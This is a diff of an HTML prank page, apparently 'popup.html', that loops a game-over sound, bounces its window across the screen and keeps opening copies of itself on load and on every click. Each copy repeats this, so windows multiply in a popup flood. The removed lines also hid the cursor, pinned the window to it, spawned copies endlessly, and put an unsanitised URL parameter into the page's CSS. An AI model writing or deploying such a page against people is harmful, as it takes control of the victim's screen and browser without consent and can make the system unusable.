@@ -2,96 +2,88 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>JANNNMG</title>
+    <title>jannnmg</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            width: 350px;
-            height: 350px;
+            width: 300px;
+            height: 200px;
             background-image: url('assets/game-over.gif');
             background-size: cover;
             background-position: center;
+            color: white;
+            text-shadow: 2px 2px 4px #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            user-select: none;
+            font-family: sans-serif;
             overflow: hidden;
-            cursor: none;
         }
     </style>
 </head>
 <body>
-    <audio id="popupSound">
-        <source src="assets/game-over-sound.mp3" type="audio/mpeg">
-    </audio>
-    
+    <audio src="assets/game-over-sound.mp3"></audio>
+
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const imageUrl = urlParams.get('image');
-        
-        if (imageUrl) {
-            document.body.style.backgroundImage = `url(${imageUrl})`;
-        }
-        
-        let x = Math.random() * (screen.availWidth - 350);
-        let y = Math.random() * (screen.availHeight - 350);
-        let vx = (Math.random() - 0.5) * 10;
-        let vy = (Math.random() - 0.5) * 10;
-        let stuckToCursor = false;
-        
-        const popupSound = document.getElementById('popupSound');
-        
+        const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+        let x = 100;
+        let y = 100;
+        let vx = 10;
+        let vy = 8;
+
         function animate() {
-            if (!stuckToCursor) {
-                const screenWidth = screen.availWidth;
-                const screenHeight = screen.availHeight;
-                const windowWidth = window.outerWidth;
-                const windowHeight = window.outerHeight;
+            const screenWidth = screen.availWidth;
+            const screenHeight = screen.availHeight;
+            const windowWidth = window.outerWidth;
+            const windowHeight = window.outerHeight;
 
-                x += vx;
-                y += vy;
+            x += vx;
+            y += vy;
 
-                if (x + windowWidth > screenWidth || x < 0) {
-                    vx = -vx;
-                }
-                if (y + windowHeight > screenHeight || y < 0) {
-                    vy = -vy;
-                }
-
-                window.moveTo(x, y);
+            if (x + windowWidth > screenWidth || x < 0) {
+                vx = -vx;
             }
-            
+            if (y + windowHeight > screenHeight || y < 0) {
+                vy = -vy;
+            }
+
+            window.moveTo(x, y);
             requestAnimationFrame(animate);
         }
-        
-        function createNewPopup() {
-            setTimeout(() => {
-                const popupUrl = imageUrl ? `popup.html?image=${encodeURIComponent(imageUrl)}` : 'popup.html';
-                window.open(popupUrl, 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
-                createNewPopup();
-            }, Math.random() * 2000 + 4000);
-        }
-        
-        document.addEventListener('mousemove', function(e) {
-            if (stuckToCursor) {
-                window.moveTo(e.screenX - 175, e.screenY - 175);
-            }
-        });
 
-        document.body.addEventListener('mouseenter', function() {
-            stuckToCursor = true;
-        });
-
-        document.body.addEventListener('mouseleave', function() {
-            stuckToCursor = false;
-        });
-        
-        document.body.addEventListener('click', function() {
-            const popupUrl = imageUrl ? `popup.html?image=${encodeURIComponent(imageUrl)}` : 'popup.html';
-            window.open(popupUrl, 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
-        });
-        
         window.onload = function() {
+            x = Math.random() * (screen.availWidth - 300);
+            y = Math.random() * (screen.availHeight - 200);
             animate();
-            createNewPopup();
-            popupSound.play();
+            document.querySelector('audio').play();
+
+            window.addEventListener('click', function() {
+                if (!isMobileDevice) {
+                    window.open('popup.html', 'popup_' + Date.now(), 'width=300,height=200,resizable=no,scrollbars=no,toolbar=no');
+                }
+            });
+            
+            if (Math.random() > 0.1) {
+                setTimeout(() => {
+                    if (!isMobileDevice) {
+                        window.open('popup.html', 'popup_' + Date.now(), 'width=300,height=200,resizable=no,scrollbars=no,toolbar=no');
+                    }
+                }, Math.random() * 1000 + 800);
+            }
+
+            for (let i = 0; i < 3; i++) {
+                if (Math.random() > 0.5) {
+                    setTimeout(() => {
+                        if (!isMobileDevice) {
+                            window.open('popup.html', 'popup_' + Date.now(), 'width=300,height=200,resizable=no,scrollbars=no,toolbar=no');
+                        }
+                    }, Math.random() * 5000 + 2000 + (i * 2000));
+                }
+            }
         };
     </script>
 </body>
